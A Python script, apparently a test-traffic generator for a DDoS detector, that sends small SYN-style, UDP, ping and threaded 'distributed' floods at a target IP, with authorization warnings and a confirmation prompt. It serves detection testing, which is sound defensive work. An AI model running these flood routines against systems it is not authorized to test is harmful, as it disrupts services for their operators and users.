#!/usr/bin/env python3
"""
DDoS Attack Simulation for Testing DDoS Detector

Generates controlled DDoS attack patterns:
1. SYN Flood - Massive SYN packets to overwhelm target
2. UDP Flood - High volume UDP traffic
3. ICMP Flood - Ping flood attack

WARNING: Use only on authorized systems for testing purposes!
"""

import socket
import time
import sys
import random
from datetime import datetime
from threading import Thread


def print_header(msg):
    """Print formatted header"""
    print("\n" + "="*60)
    print(f"  {msg}")
    print("="*60 + "\n")


def syn_flood_attack(target_ip, target_port, packet_count, rate):
    """
    Simulate SYN flood attack.

    Args:
        target_ip: Target IP address
        target_port: Target port
        packet_count: Number of SYN packets to send
        rate: Packets per second
    """
    print_header(f"SYN FLOOD ATTACK: {target_ip}:{target_port}")
    print(f"Packets: {packet_count}")
    print(f"Rate: {rate} packets/sec")
    print(f"Duration: ~{packet_count/rate:.1f}s")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    successful = 0
    failed = 0

    for i in range(packet_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Very short timeout

            # Non-blocking connect (SYN sent, don't wait for SYN-ACK)
            sock.setblocking(False)
            try:
                sock.connect((target_ip, target_port))
            except BlockingIOError:
                pass  # Expected for non-blocking socket
            except Exception:
                pass

            successful += 1
            sock.close()

            if (i + 1) % 50 == 0:
                print(f"  [{i+1:4d}/{packet_count}] Sent {i+1} SYN packets...")

            time.sleep(delay)

        except Exception as e:
            failed += 1
            if failed < 5:  # Only print first few errors
                print(f"  ! Error: {e}")

    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {successful} SYN packets sent, {failed} failed")
    return {"successful": successful, "failed": failed}


def udp_flood_attack(target_ip, target_port, packet_count, rate, packet_size=1024):
    """
    Simulate UDP flood attack.

    Args:
        target_ip: Target IP address
        target_port: Target port
        packet_count: Number of UDP packets to send
        rate: Packets per second
        packet_size: Size of each packet in bytes
    """
    print_header(f"UDP FLOOD ATTACK: {target_ip}:{target_port}")
    print(f"Packets: {packet_count}")
    print(f"Rate: {rate} packets/sec")
    print(f"Packet Size: {packet_size} bytes")
    print(f"Total Volume: {(packet_count * packet_size) / 1024 / 1024:.2f} MB")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate random payload
    payload = b'X' * packet_size

    successful = 0
    failed = 0

    for i in range(packet_count):
        try:
            sock.sendto(payload, (target_ip, target_port))
            successful += 1

            if (i + 1) % 100 == 0:
                print(f"  [{i+1:4d}/{packet_count}] Sent {i+1} UDP packets...")

            time.sleep(delay)

        except Exception as e:
            failed += 1
            if failed < 5:
                print(f"  ! Error: {e}")

    sock.close()

    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {successful} UDP packets sent, {failed} failed")
    print(f"Volume: {(successful * packet_size) / 1024 / 1024:.2f} MB")
    return {"successful": successful, "failed": failed}


def icmp_flood_attack(target_ip, packet_count, rate):
    """
    Simulate ICMP flood (ping flood) attack.

    Note: This uses regular ICMP echo requests which require raw sockets.
    On most systems, this needs root/admin privileges.

    Args:
        target_ip: Target IP address
        packet_count: Number of ICMP packets to send
        rate: Packets per second
    """
    print_header(f"ICMP FLOOD ATTACK: {target_ip}")
    print(f"Packets: {packet_count}")
    print(f"Rate: {rate} packets/sec")
    print(f"Start time: {datetime.now()}\n")

    delay = 1.0 / rate
    successful = 0
    failed = 0

    try:
        # Try to use ping command (works without root)
        import subprocess

        for i in range(packet_count):
            try:
                # Use ping with very short timeout
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '1', target_ip],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=0.5
                )

                if result.returncode == 0:
                    successful += 1
                else:
                    failed += 1

                if (i + 1) % 50 == 0:
                    print(f"  [{i+1:4d}/{packet_count}] Sent {i+1} ICMP packets...")

                time.sleep(delay)

            except Exception as e:
                failed += 1
                if failed < 5:
                    print(f"  ! Error: {e}")

        print(f"\nEnd time: {datetime.now()}")
        print(f"Summary: {successful} ICMP packets sent, {failed} failed")
        return {"successful": successful, "failed": failed}

    except FileNotFoundError:
        print("  ! Error: ping command not found")
        print("  ! ICMP flood requires ping utility or raw socket access")
        return {"successful": 0, "failed": packet_count}


def multi_source_syn_flood(target_ip, target_port, source_count, packets_per_source, rate):
    """
    Simulate distributed SYN flood from multiple sources.

    Args:
        target_ip: Target IP address
        target_port: Target port
        source_count: Number of simulated attacking sources
        packets_per_source: Packets to send from each source
        rate: Total packets per second (distributed across sources)
    """
    print_header(f"DISTRIBUTED SYN FLOOD: {target_ip}:{target_port}")
    print(f"Attacking Sources: {source_count}")
    print(f"Packets per Source: {packets_per_source}")
    print(f"Total Packets: {source_count * packets_per_source}")
    print(f"Rate: {rate} packets/sec")
    print(f"Start time: {datetime.now()}\n")

    threads = []
    results = []

    def attack_from_source(source_id):
        """Simulate attack from one source"""
        local_delay = source_count / rate  # Distribute rate across sources
        local_successful = 0

        for i in range(packets_per_source):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.setblocking(False)

                try:
                    sock.connect((target_ip, target_port))
                except BlockingIOError:
                    pass
                except Exception:
                    pass

                local_successful += 1
                sock.close()
                time.sleep(local_delay)

            except Exception:
                pass

        results.append(local_successful)
        print(f"  Source #{source_id}: {local_successful} packets sent")

    # Launch threads for each simulated source
    for source_id in range(source_count):
        thread = Thread(target=attack_from_source, args=(source_id,))
        threads.append(thread)
        thread.start()
        time.sleep(0.1)  # Stagger thread starts

    # Wait for all threads
    for thread in threads:
        thread.join()

    total_successful = sum(results)
    print(f"\nEnd time: {datetime.now()}")
    print(f"Summary: {total_successful} total packets from {source_count} sources")
    return {"total": total_successful, "sources": source_count}


if __name__ == "__main__":
    print("\n" + "="*60)
    print("  DDoS ATTACK SIMULATION TOOL")
    print("  For Testing DDoS Detector Only")
    print("="*60)

    if len(sys.argv) < 2:
        print("\nUsage:")
        print(f"  {sys.argv[0]} <target_ip>")
        print("\nExample:")
        print(f"  {sys.argv[0]} 192.168.25.1")
        print("\nThis will run DDoS attack simulations:")
        print("  1. SYN Flood (150 packets, 150 pkt/s)")
        print("  2. UDP Flood (600 packets, 600 pkt/s)")
        print("  3. ICMP Flood (150 packets, 150 pkt/s)")
        print("  4. Distributed SYN Flood (10 sources)")
        sys.exit(1)

    target = sys.argv[1]

    print(f"\n🎯 Target: {target}")
    print(f"⚠️  WARNING: Only use on authorized systems!")
    print(f"📝 This generates DDoS patterns for detection testing.\n")

    input("Press ENTER to continue or Ctrl+C to cancel...")

    # Scenario 1: SYN Flood (should trigger SYN flood detection)
    syn_flood_attack(target, 80, packet_count=150, rate=150)
    time.sleep(2)

    # Scenario 2: UDP Flood (should trigger UDP flood detection)
    udp_flood_attack(target, 9999, packet_count=600, rate=600, packet_size=512)
    time.sleep(2)

    # Scenario 3: ICMP Flood (should trigger ICMP flood detection)
    icmp_flood_attack(target, packet_count=150, rate=150)
    time.sleep(2)

    # Scenario 4: Distributed SYN Flood
    multi_source_syn_flood(target, 443, source_count=10, packets_per_source=15, rate=150)

    print_header("DDoS SIMULATION COMPLETE")
    print("✅ All scenarios executed")
    print("📦 Capture the traffic with tcpdump and analyze with pcap_analyzer")
    print("🔍 Expected detections:")
    print("   - 1 SYN Flood attack (150 pkt/s)")
    print("   - 1 UDP Flood attack (600 pkt/s)")
    print("   - 1 ICMP Flood attack (150 pkt/s)")
    print("   - 1 Distributed attack (10 sources)\n")
